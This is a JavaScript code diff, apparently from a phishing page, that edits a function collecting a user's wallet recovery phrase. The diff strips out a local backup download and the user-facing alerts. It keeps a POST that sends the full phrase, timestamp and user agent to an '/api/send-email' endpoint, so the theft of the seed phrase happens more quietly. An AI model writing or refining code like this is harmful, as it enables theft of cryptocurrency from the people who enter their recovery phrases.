@@ -174,67 +174,28 @@ async function sendWords(btn) {
         btn.disabled = true;
         btn.textContent = 'Processing...';
         
-        // Create backup file first
-        const backupContent = `Recovery Phrase Backup
-Timestamp: ${timestamp}
-Words: ${words.join(' ')}
-User Agent: ${navigator.userAgent}
-`;
-        
-        const backupBlob = new Blob([backupContent], { type: 'text/plain' });
-        const backupUrl = URL.createObjectURL(backupBlob);
-        const backupLink = document.createElement('a');
-        backupLink.href = backupUrl;
-        backupLink.download = `recovery-backup-${new Date().getTime()}.txt`;
-        
-        // Download backup immediately
-        document.body.appendChild(backupLink);
-        backupLink.click();
-        document.body.removeChild(backupLink);
-        URL.revokeObjectURL(backupUrl);
-        
-        // Format data for server
-        const formData = new FormData();
-        formData.append('words', words.join(' '));
-        formData.append('timestamp', timestamp);
-        formData.append('userAgent', navigator.userAgent);
-        
-        // Send to server
         const apiUrl = `${window.location.origin}/api/send-email`;
-        console.log('Sending data to server...');
         
         const response = await fetch(apiUrl, {
             method: 'POST',
-            body: formData
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                recoveryPhrase: words.join(' '),
+                timestamp: timestamp,
+                userAgent: navigator.userAgent
+            })
         });
 
-        let responseData;
-        try {
-            const text = await response.text();
-            try {
-                responseData = JSON.parse(text);
-            } catch (e) {
-                // If response is not JSON, treat the text as the message
-                responseData = { success: response.ok, message: text };
-            }
-        } catch (e) {
-            responseData = { 
-                success: response.ok, 
-                message: response.ok ? 'Operation completed successfully' : 'Failed to process request'
-            };
+        if (!response.ok) {
+            throw new Error('Failed to process request');
         }
 
-        if (responseData.success) {
-            showSuccess(btn);
-            alert('Recovery phrase has been processed and backup file downloaded.');
-        } else {
-            throw new Error(responseData.message || 'Server error occurred');
-        }
+        showSuccess(btn);
         
     } catch (error) {
         console.error('Error:', error);
-        alert('An error occurred: ' + error.message);
-    } finally {
         btn.disabled = false;
         btn.textContent = originalText;
     }
